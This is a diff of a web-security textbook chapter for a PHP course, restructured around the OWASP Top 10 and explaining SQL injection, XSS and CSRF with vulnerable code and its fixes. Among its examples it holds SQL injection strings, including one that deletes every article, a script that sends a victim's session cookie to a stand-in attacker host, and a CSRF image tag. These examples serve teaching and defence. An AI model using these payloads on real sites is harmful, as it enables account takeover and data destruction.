@@ -293,14 +293,28 @@ div.csl-indent {
     <h2 id="toc-title">Table of contents</h2>
    
   <ul>
-  <li><a href="#sec-09-custom-code-en" id="toc-sec-09-custom-code-en" class="nav-link active" data-scroll-target="#sec-09-custom-code-en"><span class="header-section-number">9.1</span> Vulnerabilities in Custom Code</a>
+  <li><a href="#sec-09-owasp-en" id="toc-sec-09-owasp-en" class="nav-link active" data-scroll-target="#sec-09-owasp-en"><span class="header-section-number">9.1</span> The Reference: OWASP Top 10</a></li>
+  <li><a href="#sec-09-principle-en" id="toc-sec-09-principle-en" class="nav-link" data-scroll-target="#sec-09-principle-en"><span class="header-section-number">9.2</span> Never Trust Client Data</a></li>
+  <li><a href="#sec-09-custom-code-en" id="toc-sec-09-custom-code-en" class="nav-link" data-scroll-target="#sec-09-custom-code-en"><span class="header-section-number">9.3</span> Vulnerabilities in Custom Code</a>
   <ul class="collapse">
-  <li><a href="#sec-09-sql-injection-en" id="toc-sec-09-sql-injection-en" class="nav-link" data-scroll-target="#sec-09-sql-injection-en"><span class="header-section-number">9.1.1</span> SQL Injection</a></li>
-  <li><a href="#sec-09-xss-en" id="toc-sec-09-xss-en" class="nav-link" data-scroll-target="#sec-09-xss-en"><span class="header-section-number">9.1.2</span> XSS (Cross-Site Scripting)</a></li>
-  <li><a href="#sec-09-csrf-en" id="toc-sec-09-csrf-en" class="nav-link" data-scroll-target="#sec-09-csrf-en"><span class="header-section-number">9.1.3</span> CSRF (Cross-Site Request Forgery)</a></li>
+  <li><a href="#sec-09-sql-injection-en" id="toc-sec-09-sql-injection-en" class="nav-link" data-scroll-target="#sec-09-sql-injection-en"><span class="header-section-number">9.3.1</span> SQL Injection</a></li>
+  <li><a href="#sec-09-xss-en" id="toc-sec-09-xss-en" class="nav-link" data-scroll-target="#sec-09-xss-en"><span class="header-section-number">9.3.2</span> XSS (Cross-Site Scripting)</a></li>
+  <li><a href="#sec-09-csrf-en" id="toc-sec-09-csrf-en" class="nav-link" data-scroll-target="#sec-09-csrf-en"><span class="header-section-number">9.3.3</span> CSRF (Cross-Site Request Forgery)</a></li>
+  <li><a href="#sec-09-passwords-en" id="toc-sec-09-passwords-en" class="nav-link" data-scroll-target="#sec-09-passwords-en"><span class="header-section-number">9.3.4</span> Plain-Text Passwords</a></li>
   </ul></li>
-  <li><a href="#sec-09-dependencies-en" id="toc-sec-09-dependencies-en" class="nav-link" data-scroll-target="#sec-09-dependencies-en"><span class="header-section-number">9.2</span> Vulnerabilities in Third-Party Dependencies</a></li>
-  <li><a href="#sec-09-best-practices-en" id="toc-sec-09-best-practices-en" class="nav-link" data-scroll-target="#sec-09-best-practices-en"><span class="header-section-number">9.3</span> Best Practices</a></li>
+  <li><a href="#sec-09-dependencies-en" id="toc-sec-09-dependencies-en" class="nav-link" data-scroll-target="#sec-09-dependencies-en"><span class="header-section-number">9.4</span> Vulnerabilities in Third-Party Dependencies</a></li>
+  <li><a href="#sec-09-best-practices-en" id="toc-sec-09-best-practices-en" class="nav-link" data-scroll-target="#sec-09-best-practices-en"><span class="header-section-number">9.5</span> Best Practices</a>
+  <ul class="collapse">
+  <li><a href="#sec-09-updates-en" id="toc-sec-09-updates-en" class="nav-link" data-scroll-target="#sec-09-updates-en"><span class="header-section-number">9.5.1</span> Regular updates</a></li>
+  <li><a href="#sec-09-least-privilege-en" id="toc-sec-09-least-privilege-en" class="nav-link" data-scroll-target="#sec-09-least-privilege-en"><span class="header-section-number">9.5.2</span> Principle of least privilege</a></li>
+  <li><a href="#sec-09-validate-escape-en" id="toc-sec-09-validate-escape-en" class="nav-link" data-scroll-target="#sec-09-validate-escape-en"><span class="header-section-number">9.5.3</span> Validate and escape data</a></li>
+  <li><a href="#sec-09-errors-production-en" id="toc-sec-09-errors-production-en" class="nav-link" data-scroll-target="#sec-09-errors-production-en"><span class="header-section-number">9.5.4</span> Do not show errors in production</a></li>
+  </ul></li>
+  <li><a href="#sec-09-challenge-en" id="toc-sec-09-challenge-en" class="nav-link" data-scroll-target="#sec-09-challenge-en"><span class="header-section-number">9.6</span> Challenge: Find the Flaws</a>
+  <ul class="collapse">
+  <li><a href="#sec-09-solution-en" id="toc-sec-09-solution-en" class="nav-link" data-scroll-target="#sec-09-solution-en"><span class="header-section-number">9.6.1</span> The corrected files</a></li>
+  </ul></li>
+  <li><a href="#sec-09-summary-en" id="toc-sec-09-summary-en" class="nav-link" data-scroll-target="#sec-09-summary-en"><span class="header-section-number">9.7</span> Summary</a></li>
   <li><a href="#sec-09-references-en" id="toc-sec-09-references-en" class="nav-link" data-scroll-target="#sec-09-references-en">References</a></li>
   </ul>
 </nav>
@@ -343,55 +357,597 @@ div.csl-indent {
   <div class="hero-badge">Chapter 9</div>
   <h1>Web Application Security</h1>
 </div>
-<section id="sec-09-custom-code-en" class="level2" data-number="9.1">
-<h2 data-number="9.1" class="anchored" data-anchor-id="sec-09-custom-code-en"><span class="header-section-number">9.1</span> Vulnerabilities in Custom Code</h2>
-<p>The most widely used reference for classifying web application vulnerabilities is the <code>OWASP Top 10</code>, a list of the most critical security risks, maintained by the <em>Open Worldwide Application Security Project</em> and periodically updated based on the analysis of tens of thousands of real vulnerabilities <span class="citation" data-cites="owasp_top10_2025">(<a href="cap01.html#ref-owasp_top10_2025" role="doc-biblioref">OWASP Foundation 2026</a>)</span>. Three of these vulnerabilities are particularly relevant to a PHP application like the ones developed in this course:</p>
-<section id="sec-09-sql-injection-en" class="level3" data-number="9.1.1">
-<h3 data-number="9.1.1" class="anchored" data-anchor-id="sec-09-sql-injection-en"><span class="header-section-number">9.1.1</span> SQL Injection</h3>
-<p>SQL Injection occurs when data supplied by the user is inserted directly into an SQL statement, allowing an attacker to change the meaning of that statement. Consider a login form implemented insecurely, through direct concatenation:</p>
-<div class="sourceCode" id="cb1"><pre class="sourceCode numberSource php number-lines code-with-copy"><code class="sourceCode php"><span id="cb1-1"><a href="#cb1-1"></a><span class="kw">&lt;?php</span></span>
-<span id="cb1-2"><a href="#cb1-2"></a><span class="va">$utilizador</span> <span class="op">=</span> <span class="va">$_POST</span>[<span class="st">"utilizador"</span>]<span class="ot">;</span></span>
-<span id="cb1-3"><a href="#cb1-3"></a><span class="va">$password</span> <span class="op">=</span> <span class="va">$_POST</span>[<span class="st">"password"</span>]<span class="ot">;</span></span>
-<span id="cb1-4"><a href="#cb1-4"></a></span>
-<span id="cb1-5"><a href="#cb1-5"></a><span class="va">$sql</span> <span class="op">=</span> <span class="st">"SELECT * FROM utilizadores WHERE utilizador = '</span><span class="va">$utilizador</span><span class="st">' "</span></span>
-<span id="cb1-6"><a href="#cb1-6"></a>     <span class="op">.</span> <span class="st">"AND password = '</span><span class="va">$password</span><span class="st">'"</span><span class="ot">;</span></span>
-<span id="cb1-7"><a href="#cb1-7"></a><span class="va">$resultado</span> <span class="op">=</span> <span class="va">$conexao</span>-&gt;query(<span class="va">$sql</span>)<span class="ot">;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
-<p>If an attacker enters, in the <code>utilizador</code> field, the text <code>' OR '1'='1' --</code>, the SQL statement actually executed becomes:</p>
-<div class="sourceCode" id="cb2"><pre class="sourceCode numberSource sql number-lines code-with-copy"><code class="sourceCode sql"><span id="cb2-1"><a href="#cb2-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> utilizadores</span>
-<span id="cb2-2"><a href="#cb2-2"></a><span class="kw">WHERE</span> utilizador <span class="op">=</span> <span class="st">''</span> <span class="kw">OR</span> <span class="st">'1'</span><span class="op">=</span><span class="st">'1'</span> <span class="co">-- ' AND password = '...'</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
-<p>Since <code>'1'='1'</code> is always true, and <code>--</code> turns the rest of the line into an SQL comment, ignoring the password check, this query returns the first user in the table, allowing the attacker to log in without knowing any valid password. It is avoided by always using <em>prepared statements</em>, as seen in <a href="cap08.html#sec-08-prepared-statements-en" class="quarto-xref"><span>Section 8.7</span></a>, which treat the content of <code>$_POST</code> always as a value, never as part of the SQL command, regardless of what that value contains.</p>
+<p>Before the connection to the database (<a href="cap08.html#sec-08-connecting-en" class="quarto-xref"><span>Section 8.4</span></a>), the Contraponto site only displayed information written in the code. With the database, it now receives text from strangers and stores it. This brings three responsibilities: protecting the data of readers and staff, preventing anyone from reading or changing what is not theirs, and keeping the service running with its data intact. Security is not a feature added at the end: it accompanies every line of code written.</p>
+<section id="sec-09-owasp-en" class="level2" data-number="9.1">
+<h2 data-number="9.1" class="anchored" data-anchor-id="sec-09-owasp-en"><span class="header-section-number">9.1</span> The Reference: OWASP Top 10</h2>
+<p>The most widely used reference for classifying web application vulnerabilities is the <code>OWASP Top 10</code>, a list of the most critical security risks, published by the <em>Open Worldwide Application Security Project</em> and periodically updated based on the analysis of data on real vulnerabilities <span class="citation" data-cites="owasp_top10_2025">(<a href="cap01.html#ref-owasp_top10_2025" role="doc-biblioref">OWASP Foundation 2026</a>)</span>. The most recent edition is the 2025 one. This chapter covers nine security topics, which correspond to six categories of the list:</p>
+<div id="tbl-09-owasp-en" class="quarto-float quarto-figure quarto-figure-center anchored">
+<figure class="quarto-float quarto-float-tbl figure">
+<figcaption class="quarto-float-caption-top quarto-float-caption quarto-float-tbl" id="tbl-09-owasp-en-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
+Table&nbsp;9.1: The chapter topics and the OWASP Top 10:2025 categories.
+</figcaption>
+<div aria-describedby="tbl-09-owasp-en-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
+<table class="caption-top table">
+<colgroup>
+<col style="width: 41%">
+<col style="width: 11%">
+<col style="width: 47%">
+</colgroup>
+<thead>
+<tr class="header">
+<th style="text-align: left;">Chapter topic</th>
+<th style="text-align: center;">Code</th>
+<th style="text-align: left;">OWASP Top 10:2025 category</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td style="text-align: left;"><em>SQL Injection</em></td>
+<td style="text-align: center;">A05</td>
+<td style="text-align: left;"><em>Injection</em></td>
+</tr>
+<tr class="even">
+<td style="text-align: left;">XSS</td>
+<td style="text-align: center;">A05</td>
+<td style="text-align: left;"><em>Injection</em></td>
+</tr>
+<tr class="odd">
+<td style="text-align: left;">CSRF</td>
+<td style="text-align: center;">A01</td>
+<td style="text-align: left;"><em>Broken Access Control</em></td>
+</tr>
+<tr class="even">
+<td style="text-align: left;">Passwords and <em>hash</em></td>
+<td style="text-align: center;">A04</td>
+<td style="text-align: left;"><em>Cryptographic Failures</em></td>
+</tr>
+<tr class="odd">
+<td style="text-align: left;">Secure <em>login</em></td>
+<td style="text-align: center;">A07</td>
+<td style="text-align: left;"><em>Authentication Failures</em></td>
+</tr>
+<tr class="even">
+<td style="text-align: left;">Third-party dependencies</td>
+<td style="text-align: center;">A03</td>
+<td style="text-align: left;"><em>Software Supply Chain Failures</em></td>
+</tr>
+<tr class="odd">
+<td style="text-align: left;">Least privilege</td>
+<td style="text-align: center;">A01</td>
+<td style="text-align: left;"><em>Broken Access Control</em></td>
+</tr>
+<tr class="even">
+<td style="text-align: left;">Validate and escape</td>
+<td style="text-align: center;">A05</td>
+<td style="text-align: left;"><em>Injection</em></td>
+</tr>
+<tr class="odd">
+<td style="text-align: left;">Errors in production</td>
+<td style="text-align: center;">A02</td>
+<td style="text-align: left;"><em>Security Misconfiguration</em></td>
+</tr>
+</tbody>
+</table>
+</div>
+</figure>
+</div>
+<p>The other four categories of the list (A06, A08, A09 and A10) are not covered in this chapter.</p>
 </section>
-<section id="sec-09-xss-en" class="level3" data-number="9.1.2">
-<h3 data-number="9.1.2" class="anchored" data-anchor-id="sec-09-xss-en"><span class="header-section-number">9.1.2</span> XSS (Cross-Site Scripting)</h3>
-<p>XSS occurs when data supplied by a user is displayed to other users without being properly handled, allowing an attacker to inject JavaScript code that runs in the <em>browser</em> of whoever views that page. Consider a comment box that displays the submitted text directly:</p>
-<div class="sourceCode" id="cb3"><pre class="sourceCode numberSource php number-lines code-with-copy"><code class="sourceCode php"><span id="cb3-1"><a href="#cb3-1"></a><span class="kw">&lt;?php</span></span>
-<span id="cb3-2"><a href="#cb3-2"></a><span class="kw">echo</span> <span class="st">"&lt;p&gt;"</span> <span class="op">.</span> <span class="va">$_POST</span>[<span class="st">"comentario"</span>] <span class="op">.</span> <span class="st">"&lt;/p&gt;"</span><span class="ot">;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
-<p>If an attacker submits, as a comment, the text <code>&lt;script&gt;document.location='http://atacante.com/roubo?c='+document.cookie&lt;/script&gt;</code>, that JavaScript code becomes part of the page like any other, and is automatically executed in the <em>browser</em> of any other user who visits that page, potentially, for example, sending their session <em>cookies</em> to a server controlled by the attacker. It is avoided by always escaping user-generated content before displaying it in HTML, with the <code>htmlspecialchars()</code> function, which converts special HTML characters, such as <code>&lt;</code> and <code>&gt;</code>, into their harmless equivalents:</p>
-<div class="sourceCode" id="cb4"><pre class="sourceCode numberSource php number-lines code-with-copy"><code class="sourceCode php"><span id="cb4-1"><a href="#cb4-1"></a><span class="kw">&lt;?php</span></span>
-<span id="cb4-2"><a href="#cb4-2"></a><span class="kw">echo</span> <span class="st">"&lt;p&gt;"</span> <span class="op">.</span> <span class="fu">htmlspecialchars</span>(<span class="va">$_POST</span>[<span class="st">"comentario"</span>]) <span class="op">.</span> <span class="st">"&lt;/p&gt;"</span><span class="ot">;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
-<p>This way, the attacker’s text is shown literally on the page, as visible text, and is not interpreted as code.</p>
-</section>
-<section id="sec-09-csrf-en" class="level3" data-number="9.1.3">
-<h3 data-number="9.1.3" class="anchored" data-anchor-id="sec-09-csrf-en"><span class="header-section-number">9.1.3</span> CSRF (Cross-Site Request Forgery)</h3>
-<p>CSRF occurs when an attacker tricks the <em>browser</em> of an already-authenticated user into sending, without the user noticing, a request to an application where they have an active session, exploiting the fact that the <em>browser</em> automatically sends session <em>cookies</em> on any request to that domain, as seen in <a href="cap07.html#sec-07-cookies-en" class="quarto-xref"><span>Section 7.9.1</span></a>. Imagine a banking application with a transfer implemented as a simple <code>GET</code> request:</p>
-<pre><code>GET /transferir?destino=1234&amp;valor=500</code></pre>
-<p>If a user, authenticated with that bank, visits, in another <em>browser</em> tab, a malicious page containing <code>&lt;img src="https://banco.com/transferir?destino=1234&amp;valor=500"&gt;</code>, the <em>browser</em> tries to load that “image”, automatically sending the request to the bank, along with the user’s valid session <em>cookie</em>, without the user having clicked anything. It is avoided in two complementary ways: never implement operations that change data as a simple <code>GET</code>, as already recommended in <a href="cap07.html#sec-07-get-vs-post-en" class="quarto-xref"><span>Section 7.4.3</span></a>, and include, in every sensitive form, a unique, unpredictable token, generated by the server and verified before processing the request, which a malicious page, hosted on another domain, has no way of knowing or reproducing.</p>
-<p>In all these cases, the underlying principle is the same: never trust data coming from the client, whether from a form, a URL parameter or a <em>cookie</em>, without first validating and handling it properly.</p>
-</section>
-</section>
-<section id="sec-09-dependencies-en" class="level2" data-number="9.2">
-<h2 data-number="9.2" class="anchored" data-anchor-id="sec-09-dependencies-en"><span class="header-section-number">9.2</span> Vulnerabilities in Third-Party Dependencies</h2>
-<p>The attack surface of a website is not limited to the code written directly by its programmer. Much of today’s Web is built on content management systems, such as <code>WordPress</code>, extended through third-party <em>plugins</em>, often developed by small teams or even a single independent programmer. According to Patchstack’s 2025 security report, 91% of the vulnerabilities found in the WordPress ecosystem that year were located in <em>plugins</em>, not in the <code>WordPress</code> core, and more than half of the recorded infections resulted from outdated <em>plugins</em> <span class="citation" data-cites="patchstack_2025_report">(<a href="cap01.html#ref-patchstack_2025_report" role="doc-biblioref">Patchstack 2025</a>)</span>.</p>
-<p>This reality led the most recent update of the OWASP Top 10 to introduce a category dedicated to failures in the software supply chain (<em>Software Supply Chain Failures</em>), recognising that an application’s security also depends on the security of every library, <em>framework</em> and extension it relies on, not just the code written by the team itself <span class="citation" data-cites="owasp_top10_2025">(<a href="cap01.html#ref-owasp_top10_2025" role="doc-biblioref">OWASP Foundation 2026</a>)</span>. This is why, in practice, hosting providers sometimes suspend access to a website until its vulnerable dependencies are updated: the vulnerability may not be in a single line of code written by the site’s owner, but the risk it represents is just as real.</p>
-</section>
-<section id="sec-09-best-practices-en" class="level2" data-number="9.3">
-<h2 data-number="9.3" class="anchored" data-anchor-id="sec-09-best-practices-en"><span class="header-section-number">9.3</span> Best Practices</h2>
-<p>A few simple practices significantly reduce the security risk of a web application:</p>
+<section id="sec-09-principle-en" class="level2" data-number="9.2">
+<h2 data-number="9.2" class="anchored" data-anchor-id="sec-09-principle-en"><span class="header-section-number">9.2</span> Never Trust Client Data</h2>
+<p>In a web application, the client (the <em>browser</em>) requests and displays pages, the server (PHP) handles the request and builds the page, and the database (MySQL) stores and returns the data. An attacker acts on the first link: they change what the client sends. Therefore, everything that arrives from the client (<code>$_GET</code>, <code>$_POST</code>, <code>$_COOKIE</code>) may have been altered, and even a valid request may not have been intended. This is the principle that runs through the whole chapter, and it gives rise to three classic attacks:</p>
 <ul>
-<li><strong>Regular updates</strong>: keep the underlying <em>software</em> (PHP itself, the web server, the database management system) and all third-party dependencies and extensions updated to the latest version, since many vulnerabilities are only exploited after they become publicly known;</li>
-<li><strong>Principle of least privilege</strong>: every component of an application, and every database user, should have only the permissions strictly necessary for its function, never full access for convenience;</li>
-<li><strong>Data validation and sanitisation</strong>: always treat any data coming from outside the application with suspicion, validating its format and sanitising its content before using it, whether in a database query or on a page shown to another user.</li>
+<li><strong>SQL Injection</strong> (A05): the data reaches the database carrying a malicious command, which the database executes;</li>
+<li><strong>XSS</strong> (A05): the data returns to another user’s <em>browser</em> carrying malicious code, which that <em>browser</em> executes;</li>
+<li><strong>CSRF</strong> (A01): the <em>browser</em> sends a request that looks like it comes from the user, with the session <em>cookie</em>.</li>
 </ul>
+</section>
+<section id="sec-09-custom-code-en" class="level2" data-number="9.3">
+<h2 data-number="9.3" class="anchored" data-anchor-id="sec-09-custom-code-en"><span class="header-section-number">9.3</span> Vulnerabilities in Custom Code</h2>
+<p>The vulnerabilities in this section are in code written by the programmer, and each one has a defence that is applied in that same code.</p>
+<section id="sec-09-sql-injection-en" class="level3" data-number="9.3.1">
+<h3 data-number="9.3.1" class="anchored" data-anchor-id="sec-09-sql-injection-en"><span class="header-section-number">9.3.1</span> SQL Injection</h3>
+<p><em>SQL Injection</em> occurs when text typed by the user is pasted into an SQL statement, and MySQL can no longer tell command from value (<a href="cap08.html#sec-08-prepared-statements-en" class="quarto-xref"><span>Section 8.7</span></a>). The data then carries a malicious command, which the database executes. Consider a <code>delete.php</code> that joins the <code>id</code> to the SQL statement, instead of using a <code>?</code>:</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode numberSource php number-lines code-with-copy"><code class="sourceCode php"><span id="cb1-1"><a href="#cb1-1"></a><span class="kw">&lt;?php</span></span>
+<span id="cb1-2"><a href="#cb1-2"></a><span class="va">$id</span> <span class="op">=</span> <span class="va">$_GET</span>[<span class="st">"id"</span>]<span class="ot">;</span></span>
+<span id="cb1-3"><a href="#cb1-3"></a><span class="va">$conexao</span>-&gt;query(<span class="st">"DELETE FROM artigos WHERE id = </span><span class="va">$id</span><span class="st">"</span>)<span class="ot">;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>With the normal request, <code>delete.php?id=3</code>, the statement executed is <code>DELETE FROM artigos WHERE id = 3</code>, which deletes article 3. But the attacker can request <code>delete.php?id=0 OR 1=1</code>:</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode numberSource sql number-lines code-with-copy"><code class="sourceCode sql"><span id="cb2-1"><a href="#cb2-1"></a><span class="kw">DELETE</span> <span class="kw">FROM</span> artigos <span class="kw">WHERE</span> <span class="kw">id</span> <span class="op">=</span> <span class="dv">0</span> <span class="kw">OR</span> <span class="dv">1</span><span class="op">=</span><span class="dv">1</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>The expression <code>1=1</code> is always true: with <code>OR</code>, the condition becomes true for every row, regardless of the <code>id</code>, and the <code>DELETE</code> deletes all the articles. The <code>query()</code> method does not execute two statements in the same command, so it is not possible to add, for instance, a <code>DROP</code> or another <code>DELETE</code>, but changing a condition is enough to do damage.</p>
+<p>The same mechanism allows entry into a restricted area without knowing the password. Consider a login form implemented insecurely, through direct concatenation:</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode numberSource php number-lines code-with-copy"><code class="sourceCode php"><span id="cb3-1"><a href="#cb3-1"></a><span class="kw">&lt;?php</span></span>
+<span id="cb3-2"><a href="#cb3-2"></a><span class="kw">require</span> <span class="st">"config.php"</span><span class="ot">;</span></span>
+<span id="cb3-3"><a href="#cb3-3"></a><span class="va">$utilizador</span> <span class="op">=</span> <span class="va">$_POST</span>[<span class="st">"utilizador"</span>]<span class="ot">;</span></span>
+<span id="cb3-4"><a href="#cb3-4"></a><span class="va">$password</span> <span class="op">=</span> <span class="va">$_POST</span>[<span class="st">"password"</span>]<span class="ot">;</span></span>
+<span id="cb3-5"><a href="#cb3-5"></a><span class="va">$sql</span> <span class="op">=</span> <span class="st">"SELECT * FROM utilizadores</span></span>
+<span id="cb3-6"><a href="#cb3-6"></a><span class="st">        WHERE utilizador = '</span><span class="va">$utilizador</span><span class="st">'</span></span>
+<span id="cb3-7"><a href="#cb3-7"></a><span class="st">        AND password = '</span><span class="va">$password</span><span class="st">'"</span><span class="ot">;</span></span>
+<span id="cb3-8"><a href="#cb3-8"></a><span class="va">$resultado</span> <span class="op">=</span> <span class="va">$conexao</span>-&gt;query(<span class="va">$sql</span>)<span class="ot">;</span></span>
+<span id="cb3-9"><a href="#cb3-9"></a><span class="cf">if</span> (<span class="va">$linha</span> <span class="op">=</span> <span class="va">$resultado</span>-&gt;fetch_assoc()) {</span>
+<span id="cb3-10"><a href="#cb3-10"></a>    <span class="kw">echo</span> <span class="st">"Sessão iniciada."</span><span class="ot">;</span></span>
+<span id="cb3-11"><a href="#cb3-11"></a>}</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>If an attacker enters, in the <code>utilizador</code> field, the text <code>' OR '1'='1' --</code> (with a space at the end of the text; without it, MySQL reports a syntax error), the SQL statement actually executed becomes:</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode numberSource sql number-lines code-with-copy"><code class="sourceCode sql"><span id="cb4-1"><a href="#cb4-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> utilizadores</span>
+<span id="cb4-2"><a href="#cb4-2"></a><span class="kw">WHERE</span> utilizador <span class="op">=</span> <span class="st">''</span> <span class="kw">OR</span> <span class="st">'1'</span><span class="op">=</span><span class="st">'1'</span></span>
+<span id="cb4-3"><a href="#cb4-3"></a><span class="co">-- ' AND password = '...'</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Since <code>'1'='1'</code> is always true, and <code>--</code> turns the rest of the line into an SQL comment, the password is never checked. The query returns every row and PHP uses the first one, so the attacker logs in as the first user in the table, without knowing any valid password.</p>
+<p>The defence is the one seen in <a href="cap08.html#sec-08-prepared-statements-en" class="quarto-xref"><span>Section 8.7</span></a>: always use <em>prepared statements</em>. The command goes with a <code>?</code> in place of the values, and the values travel separately. The attacker’s text stops being part of the command and becomes just a value to look for, which does not exist:</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode numberSource php number-lines code-with-copy"><code class="sourceCode php"><span id="cb5-1"><a href="#cb5-1"></a><span class="kw">&lt;?php</span></span>
+<span id="cb5-2"><a href="#cb5-2"></a><span class="kw">require</span> <span class="st">"config.php"</span><span class="ot">;</span></span>
+<span id="cb5-3"><a href="#cb5-3"></a><span class="va">$stmt</span> <span class="op">=</span> <span class="va">$conexao</span>-&gt;prepare(</span>
+<span id="cb5-4"><a href="#cb5-4"></a>    <span class="st">"SELECT * FROM utilizadores</span></span>
+<span id="cb5-5"><a href="#cb5-5"></a><span class="st">     WHERE utilizador = ? AND password = ?"</span></span>
+<span id="cb5-6"><a href="#cb5-6"></a>)<span class="ot">;</span></span>
+<span id="cb5-7"><a href="#cb5-7"></a><span class="va">$stmt</span>-&gt;bind_param(<span class="st">"ss"</span><span class="ot">,</span> <span class="va">$_POST</span>[<span class="st">"utilizador"</span>]<span class="ot">,</span> <span class="va">$_POST</span>[<span class="st">"password"</span>])<span class="ot">;</span></span>
+<span id="cb5-8"><a href="#cb5-8"></a><span class="va">$stmt</span>-&gt;execute()<span class="ot">;</span></span>
+<span id="cb5-9"><a href="#cb5-9"></a><span class="va">$resultado</span> <span class="op">=</span> <span class="va">$stmt</span>-&gt;get_result()<span class="ot">;</span></span>
+<span id="cb5-10"><a href="#cb5-10"></a><span class="cf">if</span> (<span class="va">$linha</span> <span class="op">=</span> <span class="va">$resultado</span>-&gt;fetch_assoc()) {</span>
+<span id="cb5-11"><a href="#cb5-11"></a>    <span class="kw">echo</span> <span class="st">"Sessão iniciada."</span><span class="ot">;</span></span>
+<span id="cb5-12"><a href="#cb5-12"></a>} <span class="cf">else</span> {</span>
+<span id="cb5-13"><a href="#cb5-13"></a>    <span class="kw">echo</span> <span class="st">"Utilizador ou palavra-passe inválidos."</span><span class="ot">;</span></span>
+<span id="cb5-14"><a href="#cb5-14"></a>}</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Nobody is called <code>' OR '1'='1' --</code>, so the <em>login</em> fails. One problem remains to be solved, however: the password is still compared in plain text (<a href="#sec-09-passwords-en" class="quarto-xref"><span>Section 9.3.4</span></a>).</p>
+</section>
+<section id="sec-09-xss-en" class="level3" data-number="9.3.2">
+<h3 data-number="9.3.2" class="anchored" data-anchor-id="sec-09-xss-en"><span class="header-section-number">9.3.2</span> XSS (Cross-Site Scripting)</h3>
+<p>XSS (<em>Cross-Site Scripting</em>, in which the letter “X” stands for “<em>Cross</em>”) occurs when a text written by a user, with malicious code inserted in it, is shown to other users without being handled: the <em>browser</em> interprets that code and executes it. The attacker’s code thus runs inside another site, the one under attack. Consider the comments page of an article, which displays the submitted text directly:</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode numberSource php number-lines code-with-copy"><code class="sourceCode php"><span id="cb6-1"><a href="#cb6-1"></a><span class="kw">&lt;?php</span></span>
+<span id="cb6-2"><a href="#cb6-2"></a><span class="kw">echo</span> <span class="st">"&lt;p&gt;"</span> <span class="op">.</span> <span class="va">$_POST</span>[<span class="st">"comentario"</span>] <span class="op">.</span> <span class="st">"&lt;/p&gt;"</span><span class="ot">;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>A normal comment, such as <code>Muito bom!</code>, appears as it was written. A comment with <code>&lt;b&gt;Muito bom!&lt;/b&gt;</code> appears in bold, because the <em>browser</em> interprets the tag. And a comment with a <code>&lt;script&gt;</code> shows nothing, but the code runs. The code inserted in the text has become part of the page, and the <em>browser</em> cannot tell the site’s code from the code inserted by the visitor.</p>
+<p>The attack unfolds in five steps. The attacker writes a malicious comment, for example:</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb7-1"><a href="#cb7-1"></a><span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span><span class="bu">document</span><span class="op">.</span><span class="at">location</span><span class="op">=</span><span class="st">'http://atacante.com/roubo?c='</span><span class="op">+</span><span class="bu">document</span><span class="op">.</span><span class="at">cookie</span><span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>The Contraponto site stores and displays it. When an authenticated user, such as Rita, the site manager, opens the page, she receives it with the <code>&lt;script&gt;</code> inside, and the code runs in her <em>browser</em>. The <em>script</em> sends this site’s session <em>cookie</em> to the attacker, without Rita seeing anything, and the attacker uses that <em>cookie</em> to enter the site as Rita, with her privileges (<a href="cap07.html#sec-07-sessions-en" class="quarto-xref"><span>Section 7.9.2</span></a>). Note that the <em>script</em> can only read the <em>cookies</em> of the site itself: those of other sites, such as the bank, remain out of reach.</p>
+<p>The defence is to always escape the text coming from users before displaying it in HTML, with the <code>htmlspecialchars()</code> function. This function replaces the special HTML characters (<code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code> and quotes) with harmless entities, and the <em>browser</em> displays the text instead of executing it:</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode numberSource php number-lines code-with-copy"><code class="sourceCode php"><span id="cb8-1"><a href="#cb8-1"></a><span class="kw">&lt;?php</span></span>
+<span id="cb8-2"><a href="#cb8-2"></a><span class="kw">echo</span> <span class="st">"&lt;p&gt;"</span> <span class="op">.</span> <span class="fu">htmlspecialchars</span>(<span class="va">$_POST</span>[<span class="st">"comentario"</span>]) <span class="op">.</span> <span class="st">"&lt;/p&gt;"</span><span class="ot">;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<div id="tbl-09-escape-en" class="quarto-float quarto-figure quarto-figure-center anchored">
+<figure class="quarto-float quarto-float-tbl figure">
+<figcaption class="quarto-float-caption-top quarto-float-caption quarto-float-tbl" id="tbl-09-escape-en-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
+Table&nbsp;9.2: The effect of <code>htmlspecialchars()</code>.
+</figcaption>
+<div aria-describedby="tbl-09-escape-en-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
+<table class="caption-top table">
+<colgroup>
